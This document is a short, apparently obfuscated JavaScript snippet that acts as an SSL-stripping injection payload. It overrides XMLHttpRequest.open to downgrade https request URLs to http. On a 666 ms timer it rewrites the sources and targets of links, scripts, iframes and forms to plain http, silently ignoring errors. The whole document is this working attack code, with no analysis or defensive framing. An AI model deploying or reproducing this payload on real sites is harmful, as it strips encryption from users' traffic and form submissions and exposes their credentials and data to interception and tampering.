(function() {
	var obf_open = XMLHttpRequest.prototype.open;
	XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
		obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
		return obf_open.apply(this, arguments);
	}
})();

setInterval(function(){
	try {
		document.querySelectorAll("a,link,iframe,script,form").forEach(function(obf_var_node){
			obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : "";
			obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : "";
			obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : "";
		});
	} catch(ignore){}
}, 666);
